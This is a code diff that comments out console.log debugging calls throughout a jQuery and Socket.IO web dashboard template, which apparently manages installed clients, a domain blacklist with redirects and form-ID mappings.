@@ -25,7 +25,7 @@
                 type: "post",
                 data: {},
                 success: function (response) {
-                    console.log('refreshmydude');
+                    //console.log('refreshmydude');
                 },
                 error: function (error) {
                     console.log(error)
@@ -91,10 +91,10 @@
                 element.innerHTML = "Offline";
             });
             socket.on('connect', function (id) {
-                console.log("web app connected to server")
+                //console.log("web app connected to server")
             });
             socket.on('disconnect', function (id) {
-                console.log("web app disconnected from server")
+                //console.log("web app disconnected from server")
             });
             socket.on('connectSuccessful', function (id) {
                 var fullid = "status" + id;
@@ -109,7 +109,7 @@
 
 
             socket.on('newClientInstall', function (id) {
-                console.log(id);
+                //console.log(id);
                 var rowInfo = '<tr id="row' + id + '" class="userrow" style="background-color: transparent">';
                 var idName = '<td class="text-center rowtext" style="background-color: transparent">' +
                     '<button class="transparentbutton" id="clientid"' +
@@ -358,7 +358,7 @@
                 type: "post",
                 data: {},
                 success: function (response) {
-                    console.log('success');
+                    //console.log('success');
                     {#var new_page = window.open();#}
                     {#new_page.document.write(response);#}
                     document.getElementById('blacklistDomains').innerHTML = response;
@@ -371,7 +371,7 @@
         }
 
         function handleBlacklistEntry(urldelete, redirectdelete, add) {
-            console.log(urldelete + redirectdelete + add);
+            //console.log(urldelete + redirectdelete + add);
             $.ajax({
                 url: "/blacklist",
                 type: "post",
@@ -381,7 +381,7 @@
                     add: add
                 },
                 success: function (response) {
-                    console.log(response);
+                    //console.log(response);
                     openBlacklist();
                 },
                 error: function (error) {
@@ -405,7 +405,7 @@
                     pattern: document.getElementById("pattern" + person).value
                 },
                 success: function (response) {
-                    console.log(response);
+                    //console.log(response);
                 },
                 error: function (error) {
                     console.log(error)
@@ -427,7 +427,7 @@
                     pattern: document.getElementById("pattern" + id).value
                 },
                 success: function (response) {
-                    console.log(response);
+                    //console.log(response);
                 },
                 error: function (error) {
                     console.log(error)
@@ -441,7 +441,7 @@
         function submitFormIDMappings(url, mappings) {
             var clientid = mappings[0].id
             mappings = JSON.stringify(mappings);
-            console.log(mappings);
+            //console.log(mappings);
             $.ajax({
                 url: "/sendFormIDMappings",
                 type: "post",
@@ -450,7 +450,7 @@
                     mappings: mappings
                 },
                 success: function (response) {
-                    console.log(response)
+                    //console.log(response)
                 },
                 error: function (error) {
                     console.log(error)
@@ -469,7 +469,7 @@
                     fullbh: 'true',
                 },
                 success: function (response) {
-                    console.log('success')
+                    //console.log('success')
                     var new_page = window.open();
                     new_page.document.write(response)
                     new_page.document.title = person
@@ -495,7 +495,7 @@
                             fullbh: 'false',
                         },
                         success: function (response) {
-                            console.log('success')
+                            //console.log('success')
                             var a = "collapse" + person;
 
                             childRow.innerHTML = response;
@@ -518,7 +518,7 @@
                         fullbh: 'false',
                     },
                     success: function (response) {
-                        console.log('success')
+                        //console.log('success')
                         var a = "collapse" + person;
 
                         childRow.innerHTML = response;
